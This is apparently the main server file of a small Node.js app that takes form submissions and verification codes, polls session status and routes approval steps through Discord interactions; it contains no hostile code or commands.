import "dotenv/config";
import http from "node:http";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { processRequest, processVerify, processResend, validatePayload } from "./lib/handle-submit.js";
import { createSession, getSessionStatus, submitCode, requestResendCode } from "./lib/session-store.js";
import {
  sendApprovalRequest,
  sendCodeVerificationRequest,
  sendResendApprovalRequest,
} from "./lib/discord.js";
import { handleDiscordInteraction } from "./lib/discord-interaction.js";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const PORT = process.env.PORT || 3000;

const MIME_TYPES = {
  ".html": "text/html; charset=utf-8",
  ".css": "text/css; charset=utf-8",
  ".js": "text/javascript; charset=utf-8",
  ".svg": "image/svg+xml",
  ".ico": "image/x-icon",
};

function sendJson(res, statusCode, data) {
  res.writeHead(statusCode, { "Content-Type": "application/json" });
  res.end(JSON.stringify(data));
}

function readBody(req) {
  return new Promise((resolve, reject) => {
    let raw = "";

    req.on("data", (chunk) => {
      raw += chunk;
      if (raw.length > 10_000) {
        req.destroy();
        reject(new Error("Body too large"));
      }
    });

    req.on("end", () => resolve(raw));
    req.on("error", reject);
  });
}

function serveStatic(req, res) {
  let filePath = req.url === "/" ? "/index.html" : req.url.split("?")[0];
  filePath = path.join(__dirname, filePath);

  if (!filePath.startsWith(__dirname)) {
    res.writeHead(403);
    res.end("Forbidden");
    return;
  }

  fs.readFile(filePath, (error, content) => {
    if (error) {
      res.writeHead(404);
      res.end("Not found");
      return;
    }

    const ext = path.extname(filePath);
    res.writeHead(200, { "Content-Type": MIME_TYPES[ext] || "application/octet-stream" });
    res.end(content);
  });
}

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, `http://localhost:${PORT}`);

  if (req.method === "POST" && url.pathname === "/api/submit") {
    try {
      const raw = await readBody(req);
      const body = JSON.parse(raw || "{}");
      const payload = validatePayload(body);

      if (payload.type === "request") {
        const result = await processRequest(payload, { createSession, sendApprovalRequest });
        sendJson(res, 200, result);
        return;
      }

      if (payload.type === "verify") {
        const result = await processVerify(payload, {
          submitCode,
          sendCodeVerificationRequest,
        });
        sendJson(res, 200, result);
        return;
      }

      const result = await processResend(payload, {
        requestResendCode,
        sendResendApprovalRequest,
      });
      sendJson(res, 200, result);
    } catch {
      sendJson(res, 400, { ok: false });
    }

    return;
  }

  if (req.method === "GET" && url.pathname === "/api/session") {
    const sessionId = url.searchParams.get("id");
    const status = await getSessionStatus(sessionId);
    sendJson(res, 200, { ok: true, status });
    return;
  }

  if (req.method === "POST" && url.pathname === "/api/discord-interaction") {
    try {
      const rawBody = await readBody(req);
      const signature = req.headers["x-signature-ed25519"];
      const timestamp = req.headers["x-signature-timestamp"];
      const result = await handleDiscordInteraction(rawBody, signature, timestamp);

      sendJson(res, result.status, result.body);

      if (result.afterResponse) {
        result.afterResponse().catch(console.error);
      }
    } catch {
      sendJson(res, 500, { error: "Interaction failed" });
    }

    return;
  }

  if (req.method === "GET") {
    serveStatic(req, res);
    return;
  }

  res.writeHead(405);
  res.end("Method not allowed");
});

server.listen(PORT, () => {
  console.log(`Serveur démarré sur http://localhost:${PORT}`);
});
